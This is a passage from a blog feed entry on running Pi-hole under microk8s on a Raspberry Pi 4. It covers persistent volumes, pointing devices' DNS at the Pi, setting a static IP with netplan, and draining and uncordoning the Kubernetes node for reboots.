<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># volume-dnsmasq.yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> PersistentVolume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">dnsmasq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">storageClassName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">capacity</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">storage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 1Gi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">accessModes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> ReadWriteOnce</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">hostPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">path</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"/home/ubuntu/pihole/data/dnsmasq"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I recreated all Kubernetes resources after the updates and found that the Pod ran successfully!</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">watch</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> kubectl get pv,pvc,sc,deploy,svc,pod</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                              CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                            STORAGECLASS   REASON   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolume/pihole-dnsmasq   2Gi        RWO            Retain           Bound    pihole/pihole-dnsmasq-pv-claim   manual                  13m  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolume/pihole-volume    2Gi        RWO            Retain           Bound    pihole/pihole-etc-pv-claim       manual                  13m  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                                            STATUS   VOLUME           CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolumeclaim/pihole-dnsmasq-pv-claim   Bound    pihole-dnsmasq   2Gi        RWO            manual         13m  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolumeclaim/pihole-etc-pv-claim       Bound    pihole-volume    2Gi        RWO            manual         12m  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                                 PROVISIONER   RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">storageclass.storage.k8s.io/manual   manual        Delete          Immediate           </span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain">                  7h4m </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                     READY   UP-TO-DATE   AVAILABLE   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deployment.apps/pihole   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">            </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           12m  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME             TYPE        CLUSTER-IP     EXTERNAL-IP   PORT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">S</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service/pihole   ClusterIP   </span><span class="token number" style="color:#36acaa">10.152</span><span class="token plain">.183.2   </span><span class="token number" style="color:#36acaa">10.100</span><span class="token plain">.102.95        </span><span class="token number" style="color:#36acaa">80</span><span class="token plain">/TCP,53/TCP,53/UDP   12m  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                          READY   STATUS    RESTARTS   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pod/pihole-64678974cd-mxwcw   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">          12m</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Nice! Now we have PiHole running locally on the server!
The last step was to ensure that we direct all DNS queries from our home network to the Pihole DNS server instead of our router.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="changing-dns-settings-on-devices">Changing DNS Settings on Devices<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#changing-dns-settings-on-devices" class="hash-link" aria-label="Direct link to Changing DNS Settings on Devices" title="Direct link to Changing DNS Settings on Devices">​</a></h2>
<p>The first device I changed was a 2013 MacBook Air running the latest Ubuntu Desktop that I used to SSH into the Raspberry Pi to set up Pihole.
It was quite easy to change the DNS server. Just go to <em>WiFi &gt; Choose currently connected WiFi network kegwheel &gt; IPv4 tab &gt; Disable Automatic DNS and set the IP of your Raspberry Pi IP address</em> (Search up for <code>hostname -i</code> in this page to see the command again). After I restarted my laptop, I began seeing lots of queries getting blocked:</p>
<p><img decoding="async" loading="lazy" src="https://tilsupport.files.wordpress.com/2021/05/image-1.png?w=1024" alt="rpi" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="setting-up-static-ip-for-the-cluster">Setting Up Static IP for the Cluster<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#setting-up-static-ip-for-the-cluster" class="hash-link" aria-label="Direct link to Setting Up Static IP for the Cluster" title="Direct link to Setting Up Static IP for the Cluster">​</a></h2>
<p>Unfortunately for me, I’m using my ISP’s router and not one I have full control of. This means that I do not have access to some of the router settings such as configuring the DNS server for the whole network and I can’t also control the DHCP settings. This is an important limitation because I cannot control how the router assigns IPs and I was anticipating a scheduled job I have configured in crontab to reboot the server at some point causing the router to assign a new IP within the specified range. I needed to somehow ensure that the Raspberry Pi requests a specific (static) IP address to be assigned to it after reboot.
To set up a static IP address, we need to use a tool called <a href="https://netplan.io/" target="_blank" rel="noopener noreferrer"><code>netplan</code></a>, the default Ubuntu network configuration utility.
But first, we must confirm which interface we’re going to configure to request the static IP for. In my case, I was connected to the router using the WiFi interface <code>wlan0</code>. You can find yours by running <code>ip link</code> although it’s usually <code>en0</code> for Ethernet (wired) connection and <code>wlan0</code> for WiFi.
Next, we can start interacting with the <code>netplan</code> configuration.
First, let’s create a backup file (always good practice):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /etc/netplan/50-cloud-init.yaml /etc/netplan/50-cloud-init.yaml.bak</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Next, let’s open the <code>50-cloud-init.yaml</code> configuration file to add the necessary configuration. In my case, since the interface is wlan0, I will be modifying the <code>network.wifis.wlan0</code> object but it should be the same for <code>network.ethernets.eth0</code> in case you use Ethernet.
Let’s open the file for editing:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vim</span><span class="token plain"> /etc/netplan/50-cloud-init.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And see the comments for the added fields:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">network</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">ethernets</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">eth0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">dhcp4</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean important" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">optional</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean important" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">version</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">wifis</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">wlan0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">optional</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean important" style="color:#36acaa">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">addresses</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># add section</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> 10.100.102.95/24 </span><span class="token comment" style="color:#999988;font-style:italic"># add node IP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">gateway4</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 10.100.102.1 </span><span class="token comment" style="color:#999988;font-style:italic"># add router IP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">nameservers</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># add section</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token key atrule" style="color:#00a4db">addresses</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">10.100.102.95</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> 8.8.8.8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># add node IP and Google as alternate DNS</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">access-points</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token key atrule" style="color:#00a4db">"YOUR_AP_NAME"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token key atrule" style="color:#00a4db">password</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"YOUR_AP_PW"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">dhcp4</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean important" style="color:#36acaa">false</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># true -&gt; false</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To know what’s your router/gateway IP for <code>gateway4</code>, you can run the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> default </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cut</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f3</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">10.100</span><span class="token plain">.102.1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can then apply the changes running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> netplan apply</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And we can confirm it’s set up by running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> addr show dev wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain">: wlan0: </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">BROADCAST,MULTICAST,UP,LOWER_UP</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mtu </span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"> qdisc fq_codel state UP group default qlen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    link/ether dc:a6:32:be:b8:c4 brd ff:ff:ff:ff:ff:ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    inet </span><span class="token number" style="color:#36acaa">10.100</span><span class="token plain">.102.95/24 brd </span><span class="token number" style="color:#36acaa">10.100</span><span class="token plain">.102.255 scope global dynamic wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       valid_lft 3550sec preferred_lft 3550sec</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can then restart the Raspberry Pi for the changes to take effect. Now we’ll be able to run maintenance on the device that requires restarts without breaking the whole cluster because of an incorrect address assignment by the router.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="maintenance-kubectl-drainuncordon">Maintenance, <code>kubectl drain/uncordon</code><a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#maintenance-kubectl-drainuncordon" class="hash-link" aria-label="Direct link to maintenance-kubectl-drainuncordon" title="Direct link to maintenance-kubectl-drainuncordon">​</a></h2>
<p>After about a week of running, I performed an <code>apt upgrade</code> which required me to reboot the server for the changes to apply. I needed to take the Pihole (and the whole Raspberry Pi) down.
To do this, we first need to ensure that we evict all running Kubernetes resources and that we stop scheduling of new Pods to the cluster.
We need to run the following sequence of commands to be able to ensure that our server restart runs smoothely.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Get node name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">node_name</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">kubectl get </span><span class="token variable function" style="color:#d73a49">node</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-o</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">jsonpath</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable string" style="color:#e3116c">'{.items[0].metadata.labels}'</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> jq </span><span class="token variable string" style="color:#e3116c">'."kubernetes.io/hostname"'</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Drain node, will evict all resources</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kubectl drain </span><span class="token variable" style="color:#36acaa">$node_name</span><span class="token plain"> --ignore-daemonsets --delete-local-data </span><span class="token parameter variable" style="color:#36acaa">--force</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Reboot the server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">reboot</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After reboot, wait until <code>kubelet.service</code> is up and run:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token assign-left variable" style="color:#36acaa">node_name</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">kubectl get </span><span class="token variable function" style="color:#d73a49">node</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-o</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">jsonpath</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable string" style="color:#e3116c">'{.items[0].metadata.labels}'</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> jq </span><span class="token variable string" style="color:#e3116c">'."kubernetes.io/hostname"'</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kubectl uncordon </span><span class="token variable" style="color:#36acaa">$node_name</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We should then see that the Node is schedulable and that the all Pihole resources are back up and running.</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Docker" term="Docker"/>
        <category label="How-to" term="How-to"/>
        <category label="K8s" term="K8s"/>
        <category label="Kubernetes" term="Kubernetes"/>
        <category label="Linux" term="Linux"/>
        <category label="Pihole" term="Pihole"/>
        <category label="Raspberry_pi" term="Raspberry_pi"/>
        <category label="Troubleshooting" term="Troubleshooting"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Installing Ubuntu 20.04 on 2013 MacBook Air]]></title>
